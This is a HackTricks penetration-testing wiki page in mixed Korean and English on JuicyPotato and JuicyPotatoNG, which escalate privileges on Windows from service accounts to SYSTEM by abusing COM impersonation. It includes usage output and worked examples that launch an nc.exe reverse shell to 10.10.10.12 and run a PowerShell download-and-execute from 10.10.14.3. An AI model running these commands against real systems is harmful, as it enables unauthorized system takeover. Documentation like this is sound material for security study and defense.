# JuicyPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING] > JuicyPotato는 레거시입니다. 일반적으로 Windows 10 1803 / Windows Server 2016까지의 Windows 버전에서 작동합니다. Microsoft가 Windows 10 1809 / Server 2019에서 도입한 변경사항들은 원래 기법을 깨뜨렸습니다. 해당 빌드 및 그 이후 버전에서는 PrintSpoofer, RoguePotato, SharpEfsPotato/EfsPotato, GodPotato 등과 같은 최신 대안을 고려하십시오. 최신 옵션과 사용법은 아래 페이지를 참조하세요.


{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}

## Juicy Potato (골든 권한 악용) <a href="#juicy-potato-abusing-the-golden-privileges" id="juicy-potato-abusing-the-golden-privileges"></a>

_A sugared version of_ [_RottenPotatoNG_](https://github.com/breenmachine/RottenPotatoNG)_, with a bit of juice, i.e. **another Local Privilege Escalation tool, from a Windows Service Accounts to NT AUTHORITY\SYSTEM**_

#### You can download juicypotato from [https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts](https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts)

### Compatibility quick notes

- 현재 컨텍스트에 SeImpersonatePrivilege 또는 SeAssignPrimaryTokenPrivilege가 있는 경우 Windows 10 1803 및 Windows Server 2016까지 신뢰성 있게 동작합니다.
- Windows 10 1809 / Windows Server 2019 이후의 Microsoft 하드닝으로 인해 동작하지 않습니다. 해당 빌드에서는 위에 링크된 대안들을 사용하는 것이 좋습니다.

### Summary <a href="#summary" id="summary"></a>

[**From juicy-potato Readme**](https://github.com/ohpe/juicy-potato/blob/master/README.md)**:**

[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) and its [variants](https://github.com/decoder-it/lonelypotato) leverages the privilege escalation chain based on [`BITS`](<https://msdn.microsoft.com/en-us/library/windows/desktop/bb968799(v=vs.85).aspx>) [service](https://github.com/breenmachine/RottenPotatoNG/blob/4eefb0dd89decb9763f2bf52c7a067440a9ec1f0/RottenPotatoEXE/MSFRottenPotato/MSFRottenPotato.cpp#L126) having the MiTM listener on `127.0.0.1:6666` and when you have `SeImpersonate` or `SeAssignPrimaryToken` privileges. During a Windows build review we found a setup where `BITS` was intentionally disabled and port `6666` was taken.

Windows 빌드 리뷰 중에 `BITS`가 의도적으로 비활성화되어 있고 포트 `6666`가 사용 중인 설정을 발견했습니다.

We decided to weaponize [RottenPotatoNG]: **Say hello to Juicy Potato**.

> 이론은 [Rotten Potato - Privilege Escalation from Service Accounts to SYSTEM](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/)를 참조하고 링크와 참조를 따라가세요.

We discovered that, other than `BITS` there are a several COM servers we can abuse. They just need to:

1. 현재 사용자(일반적으로 “service user”로, impersonation 권한을 가진 사용자)가 인스턴스화할 수 있어야 합니다.
2. `IMarshal` 인터페이스를 구현해야 합니다.
3. elevated user(SYSTEM, Administrator, …)로 실행되어야 합니다.

After some testing we obtained and tested an extensive list of [interesting CLSID’s](http://ohpe.it/juicy-potato/CLSID/) on several Windows versions.

### Juicy details <a href="#juicy-details" id="juicy-details"></a>

JuicyPotato allows you to:

- **Target CLSID** _원하는 CLSID를 선택하세요._ [_Here_](http://ohpe.it/juicy-potato/CLSID/) _OS별로 정리된 목록을 찾을 수 있습니다._
- **COM Listening port** _원하는 COM 리스닝 포트를 정의하세요 (마샬된 하드코딩된 6666 대신)._
- **COM Listening IP address** _서버를 원하는 IP에 바인드하세요._
- **Process creation mode** _임시로 가장된 사용자(impersonated user)의 권한에 따라 다음 중 선택할 수 있습니다:_
- `CreateProcessWithToken` (needs `SeImpersonate`)
- `CreateProcessAsUser` (needs `SeAssignPrimaryToken`)
- `both`
- **Process to launch** _exploit 성공 시 실행할 실행 파일 또는 스크립트를 지정합니다._
- **Process Argument** _실행될 프로세스의 인수를 커스터마이즈합니다._
- **RPC Server address** _은밀한 접근을 위해 외부 RPC 서버에 인증할 수 있습니다._
- **RPC Server port** _외부 서버에 인증하려 하는데 방화벽이 포트 `135`를 차단하는 경우 유용합니다…_
- **TEST mode** _주로 테스트 목적(예: CLSID 테스트)을 위한 모드입니다. DCOM을 생성하고 토큰의 사용자를 출력합니다. 테스트 관련 내용은_ [_here for testing_](http://ohpe.it/juicy-potato/Test/) _을 참조하세요._

### Usage <a href="#usage" id="usage"></a>
```
T:\>JuicyPotato.exe
JuicyPotato v0.1

Mandatory args:
-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
-p <program>: program to launch
-l <port>: COM server listen port


Optional args:
-m <ip>: COM server listen address (default 127.0.0.1)
-a <argument>: command line argument to pass to program (default NULL)
-k <ip>: RPC server ip address (default 127.0.0.1)
-n <port>: RPC server listen port (default 135)
```
### 최종 고찰 <a href="#final-thoughts" id="final-thoughts"></a>

[**From juicy-potato Readme**](https://github.com/ohpe/juicy-potato/blob/master/README.md#final-thoughts)**:**

사용자가 `SeImpersonate` 또는 `SeAssignPrimaryToken` 권한을 가지고 있다면 당신은 **SYSTEM** 입니다.

이 모든 COM Servers의 남용을 완전히 막는 것은 거의 불가능합니다. `DCOMCNFG`를 통해 해당 객체들의 권한을 수정하는 것을 고려할 수는 있지만, 성공하기 쉽지 않을 것입니다.

실제 해결책은 `* SERVICE` 계정으로 실행되는 민감한 계정과 애플리케이션을 보호하는 것입니다. `DCOM`을 중지하면 이 익스플로잇을 억제할 수는 있겠지만, 기본 OS에 심각한 영향을 줄 수 있습니다.

From: [http://ohpe.it/juicy-potato/](http://ohpe.it/juicy-potato/)

## JuicyPotatoNG (2022+)

JuicyPotatoNG는 다음을 결합하여 최신 Windows에서 JuicyPotato 스타일의 local privilege escalation을 재도입합니다:
- DCOM OXID resolution을 선택한 포트의 로컬 RPC server로 수행하여, 이전에 하드코딩된 127.0.0.1:6666 리스너를 피함.
- SSPI hook을 통해 RpcImpersonateClient를 요구하지 않고 들어오는 SYSTEM 인증을 캡처하고 가장(impersonate)함. 이는 또한 SeAssignPrimaryTokenPrivilege만 있는 경우에도 CreateProcessAsUser를 가능하게 함.
- DCOM activation 제약을 만족시키기 위한 트릭들(예: PrintNotify / ActiveX Installer Service 클래스를 대상으로 할 때 이전의 INTERACTIVE-group 요구사항).

중요 참고사항 (빌드별 동작 변화):
- September 2022: 초기 기법은 “INTERACTIVE trick”을 사용하여 지원되는 Windows 10/11 및 Server 대상에서 동작함.
- January 2023 update from the authors: Microsoft가 이후 INTERACTIVE trick을 차단함. 다른 CLSID ({A9819296-E5B3-4E67-8226-5E72CE9E1FB7})가 익스플로잇을 복원하지만, 게시물에 따르면 이는 Windows 11 / Server 2022에서만 작동함.

Basic usage (more flags in the help):
```
JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c whoami"
# Useful helpers:
#  -b  Bruteforce all CLSIDs (testing only; spawns many processes)
#  -s  Scan for a COM port not filtered by Windows Defender Firewall
#  -i  Interactive console (only with CreateProcessAsUser)
```
Windows 10 1809 / Server 2019에서 클래식 JuicyPotato가 패치된 경우, 맨 위에 링크된 대안들(RoguePotato, PrintSpoofer, EfsPotato/GodPotato 등)을 우선 사용하세요. NG는 빌드 및 서비스 상태에 따라 상황에 따라 다를 수 있습니다.

## 예제

참고: 시도해볼 CLSID 목록은 [this page](https://ohpe.it/juicy-potato/CLSID/)에서 확인하세요.

### nc.exe reverse shell 얻기
```
c:\Users\Public>JuicyPotato -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *

Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

c:\Users\Public>
```
### Powershell 리버스
```
.\jp.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
```
### Launch a new CMD (if you have RDP access)

![](<../../images/image (300).png>)

## CLSID Problems

종종 JuicyPotato가 사용하는 기본 CLSID는 **작동하지 않아서** 익스플로잇이 실패합니다. 일반적으로 **작동하는 CLSID**를 찾기 위해 여러 번 시도해야 합니다. 특정 운영체제에서 시도할 CLSID 목록을 얻으려면 다음 페이지를 방문하세요:

- [https://ohpe.it/juicy-potato/CLSID/](https://ohpe.it/juicy-potato/CLSID/)

### **Checking CLSIDs**

먼저, juicypotato.exe 외에 몇 가지 실행 파일이 필요합니다.

[Join-Object.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/utils/Join-Object.ps1)를 다운로드해 PS 세션에 로드하고, [GetCLSID.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1)를 다운로드하여 실행하세요. 해당 스크립트는 테스트할 수 있는 CLSID 목록을 생성합니다.

그다음 [test_clsid.bat ](https://github.com/ohpe/juicy-potato/blob/master/Test/test_clsid.bat)을 다운로드(클래스ID 목록과 juicypotato 실행 파일의 경로를 변경하세요)하고 실행하세요. 이 스크립트는 모든 CLSID를 차례로 시도하기 시작하며, **포트 번호가 변경되면 그 CLSID가 작동했다는 의미입니다**.

**-c 파라미터를 사용하여** 작동하는 CLSID를 **확인**하세요

## References

- [https://github.com/ohpe/juicy-potato/blob/master/README.md](https://github.com/ohpe/juicy-potato/blob/master/README.md)
- [Giving JuicyPotato a second chance: JuicyPotatoNG (decoder.it)](https://decoder.cloud/2022/09/21/giving-juicypotato-a-second-chance-juicypotatong/)

{{#include ../../banners/hacktricks-training.md}}
